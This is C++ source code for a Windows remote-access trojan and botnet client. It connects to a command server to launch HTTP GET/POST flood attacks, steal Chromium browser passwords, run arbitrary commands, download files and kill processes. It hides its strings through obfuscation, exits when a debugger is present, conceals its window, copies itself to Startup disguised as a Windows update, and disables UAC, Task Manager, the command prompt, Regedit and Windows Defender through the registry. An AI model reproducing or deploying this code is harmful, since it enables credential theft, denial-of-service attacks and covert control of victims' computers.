#define CPPHTTPLIB_OPENSSL_SUPPORT
#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <atlbase.h>
#include <atlconv.h>
#include <advobf/MetaString.h>
#include <binaryhandling.hpp>
#include <Common.hpp>
#include <CONFIG.h>
#ifdef _DEBUG
#include <iostream>
#endif
#include <functional>
#include <future>
#include <map>
#include <Payloads.hpp>
#if ENCRYPT
#include <plusaes_wrapper.hpp>
#endif
#if DEACT_TASKMGR
#include <ShellAPI.h>
#endif
#include <Stealer/Chromium.hpp>
#include <stdexcept>
#include <string>
#include <stringsplit.hpp>
#include <vector>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <winutils.hpp>
#if DEACT_TASKMGR
#pragma comment(lib, "advapi32.lib")
#endif
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "libcrypto.lib")
#pragma comment(lib, "libssl.lib")

#if ENCRYPT && !defined(PASSWRD)
#error Define the password!
#endif

int send_str(SOCKET, std::string);
int recv_str(SOCKET, std::string&);
std::string exepath, appdata(getenv(OBFUSCATED("appdata")));
bool start = true;
nk125::plusaes_wrapper aes;

#ifndef _DEBUG
void scpy2stup() { // Self copy to Startup
    nk125::binary_file_handler b;

    try {
        std::string scon = b.read_file(exepath);
        b.write_file(appdata + OBFUSCATED("\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdateInit.exe"), scon);
    }
    catch (...) {
        return;
    }
}
#endif

inline bool stlstrcmp(std::string l, const char* r) {
    return l.find(r) != std::string::npos;
}

std::string get_cmd(std::vector<std::string> sp, std::vector<std::string>& params) {
    std::string cmd;

    if (sp.size() > 0) {
        cmd = sp.at(0);
    }
    else {
        return "";
    }

    if (sp.size() > 1) {
        for (unsigned int i = 1; i < sp.size(); i++) {
            params.push_back(sp.at(i));
        }
    }

    return cmd;
}

bool kinot_size(int size, int expected, const std::string& cmd) {
#ifdef _DEBUG
    if (size != expected) {
        // If you make another server, limit the input to 2 params, otherwise INIT will be ignored
        std::cout << "Ignored " << cmd << ", invalid param count\n";
    }
#endif

    return size != expected;
}

void return_str(const SOCKET& cSock, std::string res, std::string cmd) {
    std::string sockres = "OK" DELM + cmd + DELM + res + DELM;

    send_str(cSock, sockres);
}

void parse(std::string stsock, const SOCKET& cSock) {
    using namespace andrivet::ADVobfuscator;
    nk125::stringsplit s;
    s.split(stsock, DELM);
    std::vector<std::string> params;

    std::string cmd = get_cmd(s.get_splitted_str(), params);

#ifdef _DEBUG
    std::cout << "Got CMD: " << cmd << "\n";
#endif

    if (cmd.empty()) {
#ifdef _DEBUG
        std::cout << "Empty cmd\n";
#endif
        return;
    }

    // Sorry for the yanderedev moment, but switch in C++ doesn't work like in C#
    if (stlstrcmp(cmd, OBFUSCATED("INIT"))) {
        if (kinot_size(params.size(), 3, cmd)) {
            return;
        }

        int ith;
        std::string url, type, threads;
        macaron::Base64::Decode(params.at(0), url);
        macaron::Base64::Decode(params.at(1), type);
        macaron::Base64::Decode(params.at(2), threads);

        try {
            ith = stoi(threads);
        }
        catch (...) {
            return_str(cSock, OBFUSCATED("Invalid thread num"), cmd);
            return;
        }
        //assign_map(q);

        if (nk125::str_to_lower(type) == OBFUSCATED("masspost")) {
            try {
                std::thread t(init_postflood, url, ith);
                t.detach();
            }
            catch (...) {
                return_str(cSock, OBFUSCATED("Failed to create POST thread"), cmd);
                return;
            }
        }
        else {
            // Even if an unknown type was sent, it'll fallback to GET flood
            try {
                std::thread t(init_getflood, url, ith);
                t.detach();
            }
            catch (...) {
                return_str(cSock, OBFUSCATED("Failed to create GET thread"), cmd);
                return;
            }
        }

        return_str(cSock, OBFUSCATED("OK"), cmd);

        return;
    }
    else if (stlstrcmp(cmd, OBFUSCATED("DUMP_PASS"))) {
        chromium_stealer::grab_chromium();
        return_str(cSock, chromium_stealer::con, cmd);

        chromium_stealer::con.clear();

        return;
    }
    else if (stlstrcmp(cmd, OBFUSCATED("STOP"))) {
        payloads::cont = false;
        return;
    }
    else if (stlstrcmp(cmd, OBFUSCATED("SYSTEM_INFO"))) {
        return_str(cSock, get_sysinfo(), cmd);
    }
    else if (stlstrcmp(cmd, OBFUSCATED("SUICIDE"))) {
        using std::string;
#ifndef _DEBUG
        return_str(cSock, OBFUSCATED("GOODBYE SIR!"), cmd);
#else
        std::cout << "SUICIDE Executed\n";
        return;
#endif

        std::string batch;
        std::string cd;
        cd.resize(MAX_PATH);

        GetCurrentDirectoryA(MAX_PATH, &cd[0]);

        batch = string{ OBFUSCATED("@echo off\r\n") } +
            OBFUSCATED("timeout /t 5\r\n") +
            OBFUSCATED("del \"") + exepath + OBFUSCATED("\" /F /S /Q\r\n") +
            OBFUSCATED("del %0 /F /S /Q\r\n") +
            OBFUSCATED("exit\r\n");

        nk125::binary_file_handler b;

        try {
            b.write_file(cd + OBFUSCATED("\\iwtkms.bat"), batch);
            std::thread t(exec_cmd, cd + OBFUSCATED("\\iwtkms.bat"));
            t.detach();
        }
        catch (...) {
            return_str(cSock, OBFUSCATED("Failed at self killing :("), cmd);
        }

        std::exit(0);
        return;
    }
    else if (stlstrcmp(cmd, OBFUSCATED("RESTART"))) {
        start = false;
        shutdown(cSock, SD_SEND);
        return;
    }
    else if (stlstrcmp(cmd, OBFUSCATED("DOWNLOAD"))) {
        if (kinot_size(params.size(), 2, cmd)) {
            return;
        }

        std::string URL, filename;
        macaron::Base64::Decode(params.at(0), URL);
        macaron::Base64::Decode(params.at(1), filename);

        try {
            std::thread t(download, URL, filename);
            t.detach();
        }
        catch (...) {
            return_str(cSock, OBFUSCATED("Failed to create thread"), cmd);
            return;
        }

        return_str(cSock, OBFUSCATED("File Downloaded"), cmd);
        return;
    }
    else if (stlstrcmp(cmd, OBFUSCATED("KILL"))) {
        /*if (kinot_size(params.size(), 1, cmd)) {
            return;
        }
        
        I removed the param check, in case of an emergency the last straw it's the client rejecting requests

        */

        std::string procname;
        int PID;

        macaron::Base64::Decode(params.at(0), procname);

        try {
            PID = stoi(procname);
        }
        catch (...) {
            PID = 0; // Means that procname isn't a PID
        }

        bool proc_killed = false;

        if (!PID) {
            proc_killed = nk125::killProcByName(procname);
        }
        else {
            proc_killed = nk125::killProcByPID(PID);
        }

        return_str(cSock, (proc_killed ? OBFUSCATED("Process Killed") : OBFUSCATED("Process wasn't killed")), cmd);
        return;
    }
    else if (stlstrcmp(cmd, OBFUSCATED("EXEC"))) {
        if (kinot_size(params.size(), 1, cmd)) {
            return;
        }

        std::string exe;
        
        macaron::Base64::Decode(params.at(0), exe);

        try {
            std::future<std::string> ret = std::async([&]() {
                return exec_cmd(exe);
            });

            std::thread t(return_str, cSock, ret.get(), cmd);
            t.detach();
        }
        catch (...) {
            return_str(cSock, OBFUSCATED("Failed"), cmd);
        }

        return;
    }
    else {
        // Special commands
        if (stlstrcmp(cmd, OBFUSCATED(PTXT))) {
            send_str(cSock, OBFUSCATED(PNOK));
            return;
        }
        else {
#ifdef _DEBUG
            std::cout << "Unrecognized command: " << cmd << "\n";
#endif
            return;
        }
    }

    return;
}

int send_str(SOCKET sock, std::string body) {
    long sendResult;
#if ENCRYPT
    using namespace andrivet::ADVobfuscator;
    std::string encb = aes.ecb_encrypt(body, OBFUSCATED(PASSWRD));
#else 
    std::string encb = body;
#endif

#ifdef _DEBUG
    std::cerr << "Sending string: " << body << "\n";
#endif

    sendResult = send(sock, encb.c_str(), encb.size(), 0);

    if (sendResult == SOCKET_ERROR) {
#ifdef _DEBUG
        std::cout << "Error at send()\n";
#endif
        closesocket(sock);
    }

    return sendResult;
}

int recv_str(SOCKET sock, std::string& resp) {
    long iResult;
    std::vector<char> recvbuf;
    int recvbuflen = BUF_SZ;
    resp.clear();

    recvbuf.resize(recvbuflen);
    iResult = recv(sock, &recvbuf[0], recvbuflen, 0);

    if (iResult <= 0) {
#ifdef _DEBUG
        std::cerr << "Error at recv()\n";
#endif
        closesocket(sock);
        return iResult;
    }

    recvbuf.resize(iResult);

    resp.assign(recvbuf.begin(), recvbuf.end());

#ifdef _DEBUG
    std::cerr << "Received string: " << resp << "\n";
#endif

    return iResult;
}

int init_ws() {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return 0;
    }

    int iResult;

    struct addrinfo* result = NULL,
        * ptr = NULL,
        clientAddr;

    ZeroMemory(&clientAddr, sizeof(clientAddr));
    clientAddr.ai_family = AF_INET;
    clientAddr.ai_socktype = SOCK_STREAM;
    clientAddr.ai_protocol = IPPROTO_TCP;

#ifdef DIFF_PORTS
    std::string port(std::to_string(CLT_PORT));
#else
    std::string port(std::to_string(CON_PORT));
#endif

    iResult = getaddrinfo(HOST_IP, port.c_str(), &clientAddr, &result);

    if (iResult != 0) {
#ifdef _DEBUG
        std::cerr << "getaddrinfo() fail\n";
#endif
        WSACleanup();
        std::exit(1);
    }

    SOCKET cSock = INVALID_SOCKET;
    ptr = result;

    cSock = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);

    if (cSock == INVALID_SOCKET) {
#ifdef _DEBUG
        std::cerr << "socket() fail\n";
#endif
        freeaddrinfo(result);
        WSACleanup();
        std::exit(1);
    }

    iResult = connect(cSock, ptr->ai_addr, (int)ptr->ai_addrlen);

    if (iResult == SOCKET_ERROR) {
        int secs = 5;
        for (int i = 0; i < secs; i++) {
#ifdef _DEBUG
            std::cerr << "\r connect() fail, retrying in " << (secs - i) << " seconds";
            std::cerr.flush();
#endif
            Sleep(static_cast<DWORD>(1000));
        }

        std::cout << "\n";

        closesocket(cSock);
        return 0;
    }

    freeaddrinfo(result);

    std::string gbuf;

    int res;

    res = recv_str(cSock, gbuf);

    if (res <= 0) {
        return 0;
    }

    gbuf.assign(OBFUSCATED(PNOK));
    res = send_str(cSock, gbuf);

    if (res <= 0) {
        return 0;
    }

    start = true;

#ifdef _DEBUG
    std::cout << "Sent: " << gbuf << "\n";
#endif
#if ENCRYPT
    std::string tmp_dec;
#endif

    while (start) {
        do {
            //if (check_internet_conn()) std::exit(1);
            res = recv_str(cSock, gbuf);

            if (res <= 0) {
                return 0;
            }
#if ENCRYPT
            else {
                tmp_dec += gbuf;

                if (res < BUF_SZ) {
                    gbuf = tmp_dec;
                    tmp_dec.clear();

                    using namespace andrivet::ADVobfuscator;
                    gbuf = aes.ecb_decrypt(gbuf, OBFUSCATED(PASSWRD));
                }
            }
#endif

#ifdef _DEBUG
            std::cout << "Received: " << gbuf << ", parsing...\n";
#endif

            parse(gbuf, cSock);
        } while (res > 0);
    }

    return 0;
}

#if (DEACT_TASKMGR || DEACT_CMD || DEACT_REGEDIT || DEACT_WINDEF) && !defined(_DEBUG)
bool admin_rights() {
    bool fRet = false;
    HANDLE hToken = NULL;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);

        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
    }

    if (hToken) {
        CloseHandle(hToken);
    }

    return fRet;
}
#endif

#if !defined(_DEBUG)
void deact_things() {
#if DEACT_TASKMGR || DEACT_CMD || DEACT_REGEDIT || DEACT_WINDEF
    if (!admin_rights()) {
        int r = 0;

        do {
            HINSTANCE s = ShellExecuteA(NULL, "runas", exepath.data(), NULL, NULL, SW_HIDE);
            r = reinterpret_cast<int>(s);
            std::exit(0);
        } while (r < 32);
    }
    else {
        writeSysPolicy(OBFUSCATED("EnableLUA"), 0, OBFUSCATED("SOFTWARE\\Policies\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), 1);
        writeSysPolicy(OBFUSCATED("ConsentPromptBehaviorAdmin"), 0, OBFUSCATED("SOFTWARE\\Policies\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), 1);
        writeSysPolicy(OBFUSCATED("ConsentPromptBehaviorUser"), 0, OBFUSCATED("SOFTWARE\\Policies\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), 1);
        writeSysPolicy(OBFUSCATED("PromptOnSecureDesktop"), 0, OBFUSCATED("SOFTWARE\\Policies\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), 1);
    }
#endif

#if DEACT_TASKMGR
    writeSysPolicy(OBFUSCATED("DisableTaskmgr"), 1, OBFUSCATED("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"));

    writeSysPolicy(OBFUSCATED("DisableTaskmgr"), 1, OBFUSCATED("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), 1);
#endif
#if DEACT_CMD
    writeSysPolicy(OBFUSCATED("DisableCMD"), 2, OBFUSCATED("Software\\Policies\\Microsoft\\Windows\\System"));
    writeSysPolicy(OBFUSCATED("NoRun"), 1, OBFUSCATED("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer"));
#endif
#if DEACT_REGEDIT
    writeSysPolicy(OBFUSCATED("DisableRegistryTools"), 1, OBFUSCATED("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"));
#endif
#if DEACT_WINDEF
    writeSysPolicy(OBFUSCATED("TamperProtection"), 4, OBFUSCATED("SOFTWARE\\Microsoft\\Windows Defender\\Features"), true);
    writeSysPolicy(OBFUSCATED("TamperProtectionSource"), 2, OBFUSCATED("SOFTWARE\\Microsoft\\Windows Defender\\Features"), true);
    writeSysPolicy(OBFUSCATED("DisableAntiSpyware"), 1, OBFUSCATED("SOFTWARE\\Policies\\Microsoft\\Windows Defender"), true);
    writeSysPolicy(OBFUSCATED("DisableAntiSpyware"), 1, OBFUSCATED("SOFTWARE\\Microsoft\\Windows Defender"), true);
#endif
    return;
}
#endif

#ifdef _DEBUG
int main(int argc, char* argv[]) {
    exepath.assign(argv[0]);
#else
int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmdshow) {
    typedef bool (*dbp)();
    typedef bool (*sw)(HWND, int);

    dbp func = (dbp) GetProcAddress(LoadLibraryA(OBFUSCATED("kernel32.dll")), OBFUSCATED("IsDebuggerPresent"));
    sw swin = (sw) GetProcAddress(LoadLibraryA(OBFUSCATED("user32.dll")), OBFUSCATED("ShowWindow"));
    if (func()) {
        return 0;
    }

    std::vector<wchar_t> arr;
    arr.resize(MAX_PATH);
    LPWSTR lparr = arr.data();
    
    GetModuleFileNameW(NULL, lparr, MAX_PATH);
    exepath = ATL::CW2A(lparr).m_psz;

#endif
#ifndef _DEBUG
    //scpy2stup();
    swin(GetConsoleWindow(), SW_HIDE);
    deact_things();
#endif

    while (true) {
        init_ws();
    }
}